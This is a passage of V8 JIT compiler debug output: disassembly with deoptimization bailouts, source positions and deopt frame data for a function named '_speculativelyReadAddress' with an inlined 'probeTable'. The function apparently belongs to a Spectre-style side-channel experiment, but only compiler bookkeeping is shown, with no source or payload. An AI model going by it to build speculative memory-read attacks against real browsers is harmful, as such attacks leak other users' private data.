                                                             ;; lazy deoptimization bailout 55
0x172490877b5e  11be  e8f5c50000     call 0x172490884158     ;; debug: deopt position, script offset '864'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 56
                                                             ;; eager deoptimization bailout 56
0x172490877b63  11c3  e8f5c50800     call 0x17249090415d     ;; debug: deopt position, script offset '886'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 57
                                                             ;; lazy deoptimization bailout 57
0x172490877b68  11c8  e8f5c50000     call 0x172490884162     ;; debug: deopt position, script offset '987'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'division by zero'
                                                             ;; debug: deopt index 58
                                                             ;; eager deoptimization bailout 58
0x172490877b6d  11cd  e8f5c50000     call 0x172490884167     ;; debug: deopt position, script offset '1368'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 59
                                                             ;; eager deoptimization bailout 59
0x172490877b72  11d2  e8f5c50000     call 0x17249088416c     ;; debug: deopt position, script offset '1820'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 60
                                                             ;; eager deoptimization bailout 60
0x172490877b77  11d7  e8f5c50800     call 0x172490904171     ;; debug: deopt position, script offset '886'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 61
                                                             ;; lazy deoptimization bailout 61
0x172490877b7c  11dc  e8f5c50000     call 0x172490884176     ;; debug: deopt position, script offset '987'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'division by zero'
                                                             ;; debug: deopt index 62
                                                             ;; eager deoptimization bailout 62
0x172490877b81  11e1  e8f5c50000     call 0x17249088417b     ;; debug: deopt position, script offset '987'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 63
                                                             ;; eager deoptimization bailout 63
0x172490877b86  11e6  e8f5c50000     call 0x172490884180     ;; debug: deopt position, script offset '1368'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 64
                                                             ;; eager deoptimization bailout 64
0x172490877b8b  11eb  e8f5c50000     call 0x172490884185     ;; debug: deopt position, script offset '1820'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 65
                                                             ;; eager deoptimization bailout 65
0x172490877b90  11f0  e8f5c50800     call 0x17249090418a     ;; debug: deopt position, script offset '1918'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 66
                                                             ;; lazy deoptimization bailout 66
0x172490877b95  11f5  e8f5c50800     call 0x17249090418f     ;; debug: deopt position, script offset '1781'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 67
                                                             ;; lazy deoptimization bailout 67
0x172490877b9a  11fa  e8f5c50800     call 0x172490904194     ;; debug: deopt position, script offset '1598'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 68
                                                             ;; lazy deoptimization bailout 68
0x172490877b9f  11ff  e8f5c50800     call 0x172490904199     ;; debug: deopt position, script offset '1528'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 69
                                                             ;; lazy deoptimization bailout 69
0x172490877ba4  1204  e8f5c50800     call 0x17249090419e     ;; debug: deopt position, script offset '1354'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 70
                                                             ;; lazy deoptimization bailout 70
0x172490877ba9  1209  e8f5c50800     call 0x1724909041a3     ;; debug: deopt position, script offset '1209'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 71
                                                             ;; lazy deoptimization bailout 71
0x172490877bae  120e  e8f5c50800     call 0x1724909041a8     ;; debug: deopt position, script offset '1114'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 72
                                                             ;; lazy deoptimization bailout 72
0x172490877bb3  1213  e8f5c50800     call 0x1724909041ad     ;; debug: deopt position, script offset '1051'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 73
                                                             ;; lazy deoptimization bailout 73
0x172490877bb8  1218  e8f5c50800     call 0x1724909041b2     ;; debug: deopt position, script offset '906'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 74
                                                             ;; lazy deoptimization bailout 74
0x172490877bbd  121d  e8f5c50800     call 0x1724909041b7     ;; debug: deopt position, script offset '866'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 75
                                                             ;; lazy deoptimization bailout 75
0x172490877bc2  1222  e8f5c50800     call 0x1724909041bc     ;; debug: deopt position, script offset '836'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 76
                                                             ;; lazy deoptimization bailout 76
0x172490877bc7  1227  e8f5c50800     call 0x1724909041c1     ;; debug: deopt position, script offset '750'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 77
                                                             ;; lazy deoptimization bailout 77
                  ;;; Safepoint table.

Source positions:
 pc offset  position
         0       333
        40       748
        44       750
        53       748
        75       730
        82       821
        86       836
        94       866
        9e       864
        d7       821
       106       904
       10e       906
       11f       904
       132       886
       13f       987
       183      1051
       19f      1059
       1d5      1061
       1da      1059
       1dc      1114
       1f1      1124
       24b      1209
       261      1246
       273      1232
       279      1246
       290      1214
       298      1334
       29c      1354
       2a6      1352
       2bc      1368
       2c6      1124
       2ca      1368
       2e8      1334
       317      1490
       31f      1528
       329      1526
       332      1523
       374      1543
       381      1598
       38f      1610
       3c8      1781
       3d6      1820
       403      1804
       407      1820
       411      1800
       44e      1786
       456      1891
       467      1918
       47c      1936
       496      1915
       49f      2045
       4c0       904
       4c4       906
       4d5       904
       4f5       886
       502       982
       50e       987
       51e       982
       521       987
       568      1051
       584      1059
       5bd      1061
       5c3      1059
       5c6      1114
       5e2      1124
       63e      1209
       654      1246
       665      1232
       66b      1246
       682      1214
       68a      1334
       68e      1354
       698      1352
       6ae      1368
       6b8      1124
       6c3      1368
       6e1      1334
       70a      1490
       712      1528
       71c      1526
       739      1523
       77b      1543
       788      1598
       796      1610
       7cf      1781
       7dd      1820
       80a      1804
       80e      1820
       818      1800
       855      1786
       85d      1891
       86e      1918
       878      1936
       891       771
       89c      1915
       8a5      2045
       8dd       771
       8e6       748
       8f9      2100
       904       730
       93c       864
       96a       886
       993       987
       9bb      1368
       9dd      1820
       a37       886
       a7f       987
       b24      1368
       b60      1820
       be8      1918
       d8b      1781
       df5      1598
       e61      1528
       e93      1354
       ef2      1209
       f35      1114
       f7a      1051
       faa       906
       fca       866
       ff8       836
      101f       750

Inlined functions (count = 1)
 0x39d88e2585a9 <SharedFunctionInfo probeTable>

Deoptimization Input Data (deopt points = 78)
 index  bytecode-offset    pc  commands
     0                8    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=8, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
     1                8    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=8, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
     2                8    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=8, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
     3                8    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=8, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
     4                8    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=8, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
     5              689   106  BEGIN {frame count=3, js frame count=2, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=36, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               CONSTRUCT_STUB_FRAME {bailout_id=2, function=0x3f3b16e05449 <String[10]: Uint8Array>, height=2}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               INT32_STACK_SLOT {input=20}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               JAVA_SCRIPT_BUILTIN_CONTINUATION_FRAME {bailout_id=689, function=0x3f3b16e05449 <String[10]: Uint8Array>, height=4}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               LITERAL {literal_id=5 (0x3f3b16e02691 <the_hole>)}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               LITERAL {literal_id=6 (0x3f3b16e025b1 <undefined>)}
                               LITERAL {literal_id=7 (1)}
                               STACK_SLOT {input=17}
     6               50    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=50, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
     7               50    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=50, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
     8               50    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=50, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
     9               50    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=50, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    10              132    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=132, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_REGISTER {input=rdx (bool)}
                               INT32_REGISTER {input=rdi}
                               DOUBLE_REGISTER {input=xmm0}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
    11              132    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=132, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_REGISTER {input=rdx (bool)}
                               INT32_REGISTER {input=rdi}
                               DOUBLE_REGISTER {input=xmm0}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
    12              132    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=132, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_REGISTER {input=rdx (bool)}
                               INT32_REGISTER {input=rdi}
                               DOUBLE_REGISTER {input=xmm0}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
    13              132    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=132, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_REGISTER {input=rdx (bool)}
                               INT32_REGISTER {input=rdi}
                               DOUBLE_REGISTER {input=xmm0}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
    14              689   317  BEGIN {frame count=3, js frame count=2, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=161, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=21 (bool)}
                               INT32_STACK_SLOT {input=22}
                               DOUBLE_STACK_SLOT {input=23}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               CONSTRUCT_STUB_FRAME {bailout_id=2, function=0x3f3b16e05449 <String[10]: Uint8Array>, height=2}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               INT32_STACK_SLOT {input=19}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               JAVA_SCRIPT_BUILTIN_CONTINUATION_FRAME {bailout_id=689, function=0x3f3b16e05449 <String[10]: Uint8Array>, height=4}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               LITERAL {literal_id=5 (0x3f3b16e02691 <the_hole>)}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               LITERAL {literal_id=6 (0x3f3b16e025b1 <undefined>)}
                               LITERAL {literal_id=7 (1)}
                               STACK_SLOT {input=17}
    15              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=21 (bool)}
                               INT32_STACK_SLOT {input=22}
                               DOUBLE_STACK_SLOT {input=23}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    16              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=21 (bool)}
                               INT32_STACK_SLOT {input=22}
                               DOUBLE_STACK_SLOT {input=23}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    17              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=21 (bool)}
                               INT32_STACK_SLOT {input=22}
                               DOUBLE_STACK_SLOT {input=23}
